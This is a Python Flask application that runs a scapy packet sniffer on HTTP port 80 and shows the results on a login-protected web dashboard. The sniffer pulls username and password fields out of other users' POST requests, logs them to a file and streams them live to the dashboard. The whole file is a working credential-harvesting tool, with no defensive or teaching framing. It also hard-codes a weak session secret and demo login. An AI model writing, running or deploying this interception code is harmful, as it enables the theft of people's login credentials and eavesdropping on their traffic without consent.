from flask import Flask, render_template, request, redirect, url_for, session
from flask_socketio import SocketIO, emit
import threading
from scapy.all import sniff, TCP, Raw
import re
import os

app = Flask(__name__)
app.secret_key = '2005'  # 🔒 Change this for production
socketio = SocketIO(app)

LOG_FILE = "creds_log.txt"

# Simple creds (demo)
USERNAME = "admin"
PASSWORD = "pass123"

running = False

def log_creds(data):
    with open(LOG_FILE, "a") as f:
        f.write(data + "\n")

def process_packet(pkt):
    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
        payload = pkt[Raw].load.decode(errors="ignore")
        if "POST" in payload and ("user" in payload or "pass" in payload):
            src = pkt[0][1].src
            dst = pkt[0][1].dst
            creds = re.findall(r"(\w+)=([\w@\.%\-]+)", payload)
            text = f"\n[!] Possible HTTP Credentials!\nFrom: {src} -> {dst}\n"
            for k, v in creds:
                text += f"  {k}: {v}\n"
            text += "-"*50
            print(text)
            log_creds(text)
            socketio.emit('new_creds', {'data': text})

def sniff_packets():
    sniff(filter="tcp port 80", prn=process_packet, store=False)

@app.route('/')
def index():
    if 'logged_in' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if username == USERNAME and password == PASSWORD:
        session['logged_in'] = True
        return redirect(url_for('dashboard'))
    else:
        return render_template('login.html', error="Invalid credentials")

@app.route('/dashboard')
def dashboard():
    if 'logged_in' not in session:
        return redirect(url_for('index'))
    return render_template('dashboard.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@socketio.on('start_sniffer')
def start_sniffer():
    global running
    if not running:
        running = True
        t = threading.Thread(target=sniff_packets)
        t.daemon = True
        t.start()
        emit('status', {'data': 'Sniffer Started'})

@socketio.on('stop_sniffer')
def stop_sniffer():
    global running
    running = False
    emit('status', {'data': 'Sniffer Stopped'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
